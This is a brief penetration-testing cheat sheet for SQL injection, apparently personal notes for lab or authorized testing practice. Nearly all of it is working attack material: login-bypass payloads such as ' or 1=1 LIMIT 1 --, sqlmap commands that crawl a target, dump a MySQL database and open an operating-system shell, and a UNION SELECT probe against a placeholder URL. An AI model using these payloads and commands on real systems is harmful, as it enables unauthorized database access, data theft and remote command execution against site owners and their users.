Testing for Bypasses: 

' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -

# SQLMAP

## sqlmap crawl  
sqlmap -u http://172.21.0.0 --crawl=1

## sqlmap dump database  
sqlmap -u http://172.21.0.0 --dbms=mysql --dump

## sqlmap shell  
sqlmap -u http://172.21.0.0 --dbms=mysql --os-shell

# SQLI

Testing for a row: 

- http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8